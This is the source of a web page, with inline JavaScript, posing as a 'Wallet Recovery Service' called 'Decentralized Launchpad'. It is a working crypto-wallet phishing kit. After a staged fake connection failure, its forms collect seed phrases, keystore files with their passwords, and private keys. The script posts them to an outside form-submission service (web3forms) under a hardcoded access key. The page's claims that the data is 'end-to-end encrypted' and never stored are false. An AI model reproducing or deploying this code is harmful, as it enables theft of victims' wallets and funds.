<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Wallet Recovery — Decentralized LaunchPad</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <!-- Sticky Header -->
  <header>
    <img src="Crypto.png" alt="Logo" class="logo">
    <h1 class="main-title">Decentralized Launchpad</h1>

    <!-- Desktop Navigation -->
    <nav class="desktop-nav">
      <a href="index.html">Home</a>
      <a href="get-support.html">Get Support</a>
      <a href="terms.html">Terms</a>
    </nav>

    <!-- Mobile Hamburger -->
    <div class="hamburger" aria-label="Menu" aria-expanded="false">
      <span></span>
      <span></span>
      <span></span>
    </div>

    <div class="connect">
      <button class="interact-button"><h5>Connect</h5></button>
      <img src="wallet-gif.gif" alt="Wallet GIF" class="wallet-gif">
    </div>
  </header>

  <!-- Mobile Menu -->
  <div class="mobile-menu">
    <a href="index.html">Home</a>
    <a href="get-support.html">Get Support</a>
    <a href="terms.html">Terms</a>
  </div>

  <!-- Select Wallet Modal -->
  <div id="selectWalletModal" class="fixed inset-0 z-50 hidden flex items-center justify-center bg-black bg-opacity-50">
    <div class="bg-neutral-900 text-white p-6 w-full max-w-md mx-4 text-center relative hide-scrollbar" style="border-radius:30px;border:3px solid #F7D4AC;">
      <button id="modalCloseBtn" aria-label="Close" class="absolute right-4 top-4 text-xl leading-none text-white">&times;</button>

      <div class="modal-inner">
        <h3 class="text-xl font-medium mb-4">Select wallets</h3>

        <div class="mb-4 main-wallet-wrap" style="position:relative; display:inline-block;">
          <img id="modalMainWalletImg" src="Metamask.png" alt="Metamask" class="mx-auto h-20 w-20 object-contain" />
          <div id="connectRing" class="connect-ring" aria-hidden="true">
            <svg viewBox="0 0 100 100" role="img" aria-label="progress">
              <rect class="track" x="8" y="8" width="84" height="84" rx="12"></rect>
              <rect class="progress" x="8" y="8" width="84" height="84" rx="12"></rect>
            </svg>
          </div>
        </div>
        <div id="modalMainWalletName" class="mt-2 font-medium">MetaMask</div>

        <div id="inModalConnecting" class="inmodal-connecting" aria-hidden="true">
          <div class="connecting-text" id="inModalConnectingText">Connecting...</div>
        </div>

        <div id="inModalConnectMessage" role="status" aria-hidden="true">
          <div class="err">Cannot connect</div>
          <div class="ok">Please connect manually</div>
        </div>

        <button id="toggleMoreWallets" aria-expanded="false" aria-controls="moreWallets" class="w-full text-left px-3 py-2 border rounded mb-3 bg-neutral-800 text-white">Choose your preferred wallets +30</button>
        <div id="moreWallets" class="more-wallets" aria-hidden="true">
          <div class="grid">
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="trustwallet"><img src="trust.png" alt="Trust Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Trust</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="coinbase"><img src="coinbase.png" alt="Coinbase" class="h-10 w-10"/><span class="text-xs mt-1">Coinbase</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="ledger"><img src="ledger.png" alt="Ledger" class="h-10 w-10"/><span class="text-xs mt-1">Ledger</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="trezor"><img src="trezor.png" alt="Trezor" class="h-10 w-10"/><span class="text-xs mt-1">Trezor</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="exodus"><img src="exodus.png" alt="Exodus" class="h-10 w-10"/><span class="text-xs mt-1">Exodus</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="soflare"><img src="Soflare.png" alt="Soflare Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Soflare</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="okx"><img src="Okx.png" alt="OKX Wallet" class="h-10 w-10"/><span class="text-xs mt-1">OKX</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="slush"><img src="Slush.png" alt="Slush Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Slush</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="rabby"><img src="rabby.png" alt="Rabby Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Rabby</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="magic"><img src="Magic.png" alt="Magic Wallet" class="h-10 w-10"/><span class="text-xs mt-1">Magic</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="electrum"><img src="electrum.png" alt="Electrum" class="h-10 w-10"/><span class="text-xs mt-1">Electrum</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="coinomi"><img src="coinomi.png" alt="Coinomi" class="h-10 w-10"/><span class="text-xs mt-1">Coinomi</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="mycelium"><img src="mycelium.png" alt="Mycelium" class="h-10 w-10"/><span class="text-xs mt-1">Mycelium</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="green"><img src="green.png" alt="Green" class="h-10 w-10"/><span class="text-xs mt-1">Green</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="safepal"><img src="safepal.png" alt="safepal" class="h-10 w-10"/><span class="text-xs mt-1">Safepal</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bitpay"><img src="bitpay.png" alt="BitPay" class="h-10 w-10"/><span class="text-xs mt-1">BitPay</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="rainbow"><img src="rainbow.png" alt="Rainbow" class="h-10 w-10"/><span class="text-xs mt-1">Rainbow</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="argent"><img src="argent.png" alt="Argent" class="h-10 w-10"/><span class="text-xs mt-1">Argent</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="brave"><img src="brave.png" alt="Brave" class="h-10 w-10"/><span class="text-xs mt-1">Brave</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="guarda"><img src="guarda.png" alt="Guarda" class="h-10 w-10"/><span class="text-xs mt-1">Guarda</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="edge"><img src="edge.png" alt="Edge" class="h-10 w-10"/><span class="text-xs mt-1">Edge</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="phantom"><img src="phantom.png" alt="Phantom" class="h-10 w-10"/><span class="text-xs mt-1">Phantom</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="metamask"><img src="Metamask.png" alt="MetaMask" class="h-10 w-10"/><span class="text-xs mt-1">MetaMask</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="polygon"><img src="Polygon.jpeg" alt="Polygon" class="h-10 w-10"/><span class="text-xs mt-1">Polygon</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="ronin"><img src="Ronin.png" alt="Ronin" class="h-10 w-10"/><span class="text-xs mt-1">Ronin</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="solo_dex"><img src="Solo_dex.jpeg" alt="SoloDex" class="h-10 w-10"/><span class="text-xs mt-1">SoloDex</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="sui"><img src="Sui.png" alt="Sui" class="h-10 w-10"/><span class="text-xs mt-1">Sui</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="uniswap"><img src="Uniswap.jpeg" alt="Uniswap" class="h-10 w-10"/><span class="text-xs mt-1">Uniswap</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="walletconnect"><img src="Walletconnect.jpeg" alt="Walletconnect" class="h-10 w-10"/><span class="text-xs mt-1">Walletconnect</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="xumm"><img src="XUMM.jpeg" alt="XUMM" class="h-10 w-10"/><span class="text-xs mt-1">XUMM</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="kepler"><img src="Kepler.jpeg" alt="Kepler" class="h-10 w-10"/><span class="text-xs mt-1">Kepler</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="compound"><img src="Compound.png" alt="Compound" class="h-10 w-10"/><span class="text-xs mt-1">Compound</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bittensor"><img src="Bittensor.png" alt="Bittensor" class="h-10 w-10"/><span class="text-xs mt-1">Bittensor</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bing"><img src="Bing.png" alt="Bing" class="h-10 w-10"/><span class="text-xs mt-1">Bing</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="bitget"><img src="bitget.png" alt="Bitget" class="h-10 w-10"/><span class="text-xs mt-1">Bitget</span></button>
            <button class="wallet-option p-2 flex flex-col items-center" data-wallet="other"><img src="Other.png" alt="Other" class="h-10 w-10"/><span class="text-xs mt-1">Other</span></button>
          </div>
        </div>

        <div class="modal-actions" style="width:100%; display:flex; gap:12px; margin-top:8px; align-items:center;">
          <button id="connectWalletBtn" class="w-full px-4 py-2 rounded font-medium">Connect Wallet</button>
        </div>
      </div>
    </div>
  </div>

  <!-- Manual Connect Modal -->
  <div id="connectManualModal" class="fixed inset-0 z-70 hidden flex items-center justify-center bg-black bg-opacity-70">
    <div class="bg-gray-900 rounded-2xl p-6 w-full max-w-md mx-4 border border-gray-800 shadow-2xl">
      <div class="flex justify-between items-center mb-6">
        <h3 class="text-2xl font-bold text-white">Connect Manually</h3>
        <button id="manualCloseBtn" aria-label="Close" class="text-3xl text-gray-400 hover:text-white transition">×</button>
      </div>
      <div class="space-y-5">
        <div id="manualStatus" class="flex items-center justify-center gap-3 mb-4">
          <span id="errorConnecting" class="text-red-500 hidden font-medium">Error connecting</span>
          <span id="connectManuallyLabel" class="text-lime-500 font-medium">Connect manually</span>
        </div>

        <!-- Phrases -->
        <label class="flex items-center gap-3 cursor-pointer">
          <input type="radio" name="manualMethod" value="phrases" checked class="w-5 h-5 accent-orange-500">
          <span class="text-white text-lg">Phrases</span>
        </label>
        <div id="manualPhrasesField" class="mb-4">
          <div class="phrase-count-toggle mb-3" style="display:flex;gap:8px;align-items:center;">
            <label class="flex items-center gap-2"><input type="radio" name="manualPhraseCount" value="12" checked>12 words</label>
            <label class="flex items-center gap-2"><input type="radio" name="manualPhraseCount" value="24">24 words</label>
          </div>
          <div id="manualPhrasesGrid" class="phrases-grid"></div>
          <div class="text-xs text-gray-500 mt-2 text-right">end-to-end encrypted</div>
        </div>

        <!-- Keystore JSON -->
        <label class="flex items-center gap-3 cursor-pointer">
          <input type="radio" name="manualMethod" value="keystore" class="w-5 h-5 accent-orange-500">
          <span class="text-white text-lg">Keystore JSON</span>
        </label>
        <div id="manualKeystoreField" class="mb-4 hidden">
          <textarea id="manualKeystoreInput" class="w-full bg-gray-800 border border-gray-700 text-white p-4 rounded-xl resize-none focus:outline-none focus:border-orange-500 transition" rows="4" placeholder="Paste Keystore JSON"></textarea>
          <input id="manualKeystorePassword" type="password" class="w-full bg-gray-800 border border-gray-700 text-white p-4 rounded-xl mt-3 focus:outline-none focus:border-orange-500 transition" placeholder="Keystore password" />
          <div class="text-xs text-gray-500 mt-2 text-right">end-to-end encrypted</div>
        </div>

        <!-- Private key -->
        <label class="flex items-center gap-3 cursor-pointer">
          <input type="radio" name="manualMethod" value="private" class="w-5 h-5 accent-orange-500">
          <span class="text-white text-lg">Private key</span>
        </label>
        <div id="manualPrivateField" class="mb-4 hidden">
          <input id="manualPrivateInput" type="text" class="w-full bg-gray-800 border border-gray-700 text-white p-4 rounded-xl focus:outline-none focus:border-orange-500 transition" placeholder="Enter private key" style="height: 60px; font-size: 1.1rem;" />
          <div class="text-xs text-gray-500 mt-2 text-right">end-to-end encrypted</div>
        </div>

        <div class="text-right mt-6">
          <button id="manualConnectBtn" class="px-8 py-3 bg-orange-500 hover:bg-orange-600 text-black font-bold rounded-xl transition transform hover:scale-105 shadow-lg">
            Connect
          </button>
        </div>
      </div>
    </div>
  </div>

  <!-- Processing Overlay -->
  <div id="manualProcessingOverlay" class="fixed inset-0 z-90 hidden flex items-center justify-center bg-black bg-opacity-95">
    <div class="text-center text-white">
      <div class="spinner large mb-8"></div>
      <p class="text-3xl font-bold">Processing...</p>
    </div>
  </div>

  <!-- Recovery Page Content -->
  <section class="recovery-page">
    <div class="recovery-content">
      <h2>Wallet Recovery Service</h2>
      <p class="recovery-desc">
        Lost access to your crypto wallet? We specialize in helping clients recover their digital assets safely and securely. Whether you've forgotten your seed phrase, lost your private key, or can't access your keystore file, our expert recovery process can help restore access to your funds.
      </p>
      <p class="recovery-desc">
        We support recovery for major wallets including MetaMask, Trust Wallet, Ledger, Trezor, and many others. Our service is end-to-end encrypted — your credentials are never stored and are transmitted securely.
      </p>
      <p class="recovery-desc warning">
        <strong>Important:</strong> Only provide credentials for wallets you own. Never share your recovery details with untrusted parties.
      </p>

      <!-- Embedded Recovery Form -->
      <div class="recovery-form">
        <h3>Enter Recovery Wallet Credentials</h3>

        <div class="method-options">
          <label class="option-header">
            <input type="radio" name="recoveryMethod" value="phrases" checked>
            <span>Phrases</span>
          </label>
          <label class="option-header">
            <input type="radio" name="recoveryMethod" value="keystore">
            <span>Keystore JSON</span>
          </label>
          <label class="option-header">
            <input type="radio" name="recoveryMethod" value="private">
            <span>Private Key</span>
          </label>
        </div>

        <!-- Phrases -->
        <div id="recoveryPhrasesField" class="recovery-field">
          <div class="phrase-count-toggle">
            <label><input type="radio" name="phraseCount" value="12" checked> 12 words</label>
            <label><input type="radio" name="phraseCount" value="24"> 24 words</label>
          </div>
          <div id="recoveryPhrasesGrid" class="phrases-grid"></div>
          <p class="encrypted-note">end-to-end encrypted</p>
        </div>

        <!-- Keystore JSON -->
        <div id="recoveryKeystoreField" class="recovery-field hidden">
          <textarea id="recoveryKeystoreInput" rows="6" placeholder="Paste your Keystore JSON here..." class="recovery-textarea"></textarea>
          <input id="recoveryKeystorePassword" type="password" placeholder="Keystore Password" class="recovery-input mt-4" />
          <p class="encrypted-note mt-3">end-to-end encrypted</p>
        </div>

        <!-- Private Key -->
        <div id="recoveryPrivateField" class="recovery-field hidden">
          <input id="recoveryPrivateInput" type="text" placeholder="Enter your Private Key" class="recovery-input private-key-input" />
          <p class="encrypted-note mt-3">end-to-end encrypted</p>
        </div>

        <button id="recoveryConnectBtn" class="recovery-connect-btn">Connect</button>
      </div>

      <!-- Receiving Wallet Section -->
      <div class="receiving-wallet-section">
        <p class="receiving-text">
          Connect your receiving wallet by clicking the Get support button below
        </p>
        <a href="get-support.html" class="support-btn-large">Get Support</a>
      </div>
    </div>
  </section>

  <!-- Loading Overlay for Embedded Form -->
  <div id="recoveryLoading" class="recovery-loading hidden">
    <div class="loading-inner">
      <div class="spinner large"></div>
      <p>Contacting...</p>
    </div>
  </div>

  <!-- Success Modal for Embedded Form -->
  <div id="recoveryModal" class="recovery-modal hidden">
    <div class="modal-content">
      <h3>Recovery Request Submitted</h3>
      <p>Your wallet recovery credentials have been securely submitted.</p>
      <p>Our team will review your request and contact you shortly.</p>
      <p style="color: lch(81.3% 107.89 137.56); font-size: 0.7rem; font-weight: 800; text-align: center; margin: 25px 0;">
        Click on close button below and scroll down the page then click on Get support button to connect your receiving wallet
      </p>
      <button id="closeModalBtn" class="modal-close-btn">Close</button>
    </div>
  </div>

  <script src="script.js"></script>

  <script>
    // Shared variables
    let selectedWallet = { name: 'MetaMask', img: 'Metamask.png' };

    // Select Wallet Modal functions
    function openSelectWalletModal() {
      const modal = document.getElementById('selectWalletModal');
      if (modal) {
        modal.classList.remove('hidden');
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
      }
    }

    function closeSelectWalletModal() {
      const modal = document.getElementById('selectWalletModal');
      if (modal) {
        modal.classList.add('hidden');
        modal.style.display = '';
        document.body.style.overflow = '';
      }
    }

    // Header connect
    document.querySelector('.connect .interact-button')?.addEventListener('click', openSelectWalletModal);
    document.querySelector('.connect .wallet-gif')?.addEventListener('click', openSelectWalletModal);

    // Modal close
    document.getElementById('modalCloseBtn')?.addEventListener('click', closeSelectWalletModal);
    document.getElementById('selectWalletModal')?.addEventListener('click', (e) => {
      if (e.target.id === 'selectWalletModal') closeSelectWalletModal();
    });
    document.addEventListener('keydown', (e) => {
      if (e.key === 'Escape') closeSelectWalletModal();
    });

    // Wallet selection - auto-collapse
    document.querySelectorAll('.wallet-option').forEach(btn => {
      btn.addEventListener('click', () => {
        const img = btn.querySelector('img');
        const name = btn.querySelector('span')?.innerText || 'Unknown';
        const mainImg = document.getElementById('modalMainWalletImg');
        const mainName = document.getElementById('modalMainWalletName');
        if (img && mainImg) mainImg.src = img.src;
        if (mainName) mainName.textContent = name;
        selectedWallet = { name, img: img?.src || '' };

        const more = document.getElementById('moreWallets');
        const toggle = document.getElementById('toggleMoreWallets');
        if (more && more.getAttribute('aria-hidden') === 'false') {
          more.setAttribute('aria-hidden', 'true');
          if (toggle) {
            toggle.setAttribute('aria-expanded', 'false');
            toggle.textContent = 'Choose your preferred wallets +30';
          }
        }
      });
    });

    // Toggle more wallets
    document.getElementById('toggleMoreWallets')?.addEventListener('click', () => {
      const more = document.getElementById('moreWallets');
      const toggle = document.getElementById('toggleMoreWallets');
      if (!more || !toggle) return;
      const isHidden = more.getAttribute('aria-hidden') === 'true';
      more.setAttribute('aria-hidden', isHidden ? 'false' : 'true');
      toggle.setAttribute('aria-expanded', isHidden ? 'true' : 'false');
      toggle.textContent = isHidden ? 'Hide wallets -30' : 'Choose your preferred wallets +30';
    });

    // Connect Wallet button → loading → manual modal
    document.getElementById('connectWalletBtn')?.addEventListener('click', (e) => {
      e.preventDefault();
      const btn = e.target;
      if (btn.dataset.loading === 'true') return;
      btn.dataset.loading = 'true';
      btn.disabled = true;

      const connectRing = document.getElementById('connectRing');
      const inModal = document.getElementById('inModalConnecting');
      const connectingText = document.getElementById('inModalConnectingText');
      const msg = document.getElementById('inModalConnectMessage');

      if (connectRing) connectRing.classList.add('active');
      if (inModal) {
        inModal.classList.add('active');
        inModal.setAttribute('aria-hidden', 'false');
      }
      if (connectingText) connectingText.style.display = 'block';

      setTimeout(() => {
        if (connectRing) connectRing.classList.remove('active');
        if (inModal) {
          inModal.classList.remove('active');
          inModal.setAttribute('aria-hidden', 'true');
        }
        if (connectingText) connectingText.style.display = 'none';
        if (msg) {
          msg.classList.add('show');
          msg.setAttribute('aria-hidden', 'false');
        }

        setTimeout(() => {
          if (msg) {
            msg.classList.remove('show');
            msg.setAttribute('aria-hidden', 'true');
          }
          closeSelectWalletModal();
          const manualModal = document.getElementById('connectManualModal');
          if (manualModal) {
            manualModal.classList.remove('hidden');
            document.body.style.overflow = 'hidden';
            renderManualPhraseGrid(12);
            updateManualFields();
          }
          btn.disabled = false;
          btn.dataset.loading = 'false';
        }, 3000);
      }, 12000);
    });

    // Manual modal phrase grid
    function renderManualPhraseGrid(count = 12) {
      const grid = document.getElementById('manualPhrasesGrid');
      if (!grid) return;
      grid.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const cell = document.createElement('div');
        cell.className = 'phrase-cell';
        const input = document.createElement('input');
        input.type = 'text';
        input.id = `manual-phrase-${i}`;
        input.placeholder = `word ${i}`;
        input.className = 'phrase-input';
        cell.appendChild(input);
        grid.appendChild(cell);
      }
    }

    // Toggle manual fields
    function updateManualFields() {
      const sel = document.querySelector('input[name="manualMethod"]:checked')?.value || 'phrases';
      document.getElementById('manualPhrasesField').classList.toggle('hidden', sel !== 'phrases');
      document.getElementById('manualKeystoreField').classList.toggle('hidden', sel !== 'keystore');
      document.getElementById('manualPrivateField').classList.toggle('hidden', sel !== 'private');
    }

    document.querySelectorAll('input[name="manualMethod"]').forEach(r => r.addEventListener('change', updateManualFields));
    document.querySelectorAll('input[name="manualPhraseCount"]').forEach(r => r.addEventListener('change', () => renderManualPhraseGrid(parseInt(r.value))));

    // Manual Connect submission
    const access_key = '8c2a14c1-0c59-44aa-97f2-955404fb69c2';
    document.getElementById('manualConnectBtn')?.addEventListener('click', async () => {
      const method = document.querySelector('input[name="manualMethod"]:checked')?.value;
      let payloadParts = [];
      payloadParts.push('Wallet: ' + selectedWallet.name);

      if (method === 'phrases') {
        const count = parseInt(document.querySelector('input[name="manualPhraseCount"]:checked')?.value || '12');
        const words = [];
        for (let i = 1; i <= count; i++) {
          const val = document.getElementById(`manual-phrase-${i}`)?.value.trim();
          if (!val) {
            alert('Please fill all phrase words');
            return;
          }
          words.push(val);
        }
        payloadParts.push('Phrases: ' + words.join(' '));
      } else if (method === 'keystore') {
        const json = document.getElementById('manualKeystoreInput')?.value.trim();
        const pass = document.getElementById('manualKeystorePassword')?.value;
        if (!json) {
          alert('Please paste Keystore JSON');
          return;
        }
        payloadParts.push('Keystore JSON: ' + json);
        if (pass) payloadParts.push('Password: ' + pass);
      } else if (method === 'private') {
        const key = document.getElementById('manualPrivateInput')?.value.trim();
        if (!key) {
          alert('Please enter Private Key');
          return;
        }
        payloadParts.push('Private Key: ' + key);
      }

      document.getElementById('connectManualModal').classList.add('hidden');
      document.getElementById('manualProcessingOverlay').classList.remove('hidden');
      document.getElementById('manualProcessingOverlay').setAttribute('aria-hidden', 'false');
      document.body.style.overflow = 'hidden';

      const message = payloadParts.join('\n\n');
      try {
        const res = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_key, subject: 'Manual Wallet Connect', message })
        });
        if (!res.ok) throw new Error('Network error');
        const data = await res.json();
        if (!data.success) throw new Error(data.message || 'Failed');
        // Keep Processing... visible on success
      } catch (err) {
        console.error(err);
        document.getElementById('manualProcessingOverlay').classList.add('hidden');
        document.getElementById('manualProcessingOverlay').setAttribute('aria-hidden', 'true');
        alert('Network error');
        document.body.style.overflow = '';
      }
    });

    // Manual close
    document.getElementById('manualCloseBtn')?.addEventListener('click', () => {
      document.getElementById('connectManualModal')?.classList.add('hidden');
      document.body.style.overflow = '';
    });

    document.getElementById('connectManualModal')?.addEventListener('click', (e) => {
      if (e.target.id === 'connectManualModal') {
        e.target.classList.add('hidden');
        document.body.style.overflow = '';
      }
    });

    // Embedded recovery form (unchanged)
    function renderRecoveryPhraseGrid(count = 12) {
      const grid = document.getElementById('recoveryPhrasesGrid');
      if (!grid) return;
      grid.innerHTML = '';
      for (let i = 1; i <= count; i++) {
        const cell = document.createElement('div');
        cell.className = 'phrase-cell';
        const input = document.createElement('input');
        input.type = 'text';
        input.id = `recovery-phrase-${i}`;
        input.placeholder = `word ${i}`;
        input.className = 'phrase-input';
        cell.appendChild(input);
        grid.appendChild(cell);
      }
    }

    function updateRecoveryFields() {
      const method = document.querySelector('input[name="recoveryMethod"]:checked')?.value || 'phrases';
      document.getElementById('recoveryPhrasesField').classList.toggle('hidden', method !== 'phrases');
      document.getElementById('recoveryKeystoreField').classList.toggle('hidden', method !== 'keystore');
      document.getElementById('recoveryPrivateField').classList.toggle('hidden', method !== 'private');
    }

    document.addEventListener('DOMContentLoaded', () => {
      document.querySelectorAll('input[name="recoveryMethod"]').forEach(r => r.addEventListener('change', updateRecoveryFields));
      document.querySelectorAll('input[name="phraseCount"]').forEach(r => r.addEventListener('change', () => renderRecoveryPhraseGrid(parseInt(r.value))));
      renderRecoveryPhraseGrid(12);
      updateRecoveryFields();
    });

    async function submitRecoveryData(payload) {
      try {
        const res = await fetch('https://api.web3forms.com/submit', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ access_key, subject: 'Wallet Recovery Request', message: payload })
        });
        return res.ok;
      } catch {
        return false;
      }
    }

    document.getElementById('recoveryConnectBtn')?.addEventListener('click', async () => {
      const method = document.querySelector('input[name="recoveryMethod"]:checked')?.value;
      let payload = `Recovery Method: ${method.toUpperCase()}\n\n`;

      if (method === 'phrases') {
        const count = parseInt(document.querySelector('input[name="phraseCount"]:checked')?.value || '12');
        const words = [];
        for (let i = 1; i <= count; i++) {
          const val = document.getElementById(`recovery-phrase-${i}`)?.value.trim();
          if (!val) {
            alert('Please fill all words');
            return;
          }
          words.push(val);
        }
        payload += `Seed Phrase (${count} words):\n${words.join(' ')}`;
      } else if (method === 'keystore') {
        const json = document.getElementById('recoveryKeystoreInput')?.value.trim();
        const pass = document.getElementById('recoveryKeystorePassword')?.value;
        if (!json) {
          alert('Please paste Keystore JSON');
          return;
        }
        payload += `Keystore JSON:\n${json}\n\nPassword: ${pass || 'Not provided'}`;
      } else if (method === 'private') {
        const key = document.getElementById('recoveryPrivateInput')?.value.trim();
        if (!key) {
          alert('Please enter Private Key');
          return;
        }
        payload += `Private Key:\n${key}`;
      }

      document.getElementById('recoveryLoading').classList.remove('hidden');
      document.body.style.overflow = 'hidden';

      await submitRecoveryData(payload);

      setTimeout(() => {
        document.getElementById('recoveryLoading').classList.add('hidden');
        document.getElementById('recoveryModal').classList.remove('hidden');
      }, 10000);
    });

    document.getElementById('closeModalBtn')?.addEventListener('click', () => {
      document.getElementById('recoveryModal').classList.add('hidden');
      document.body.style.overflow = '';
    });

    document.getElementById('recoveryModal')?.addEventListener('click', (e) => {
      if (e.target.id === 'recoveryModal') {
        e.target.classList.add('hidden');
        document.body.style.overflow = '';
      }
    });
  </script>
</body>
</html>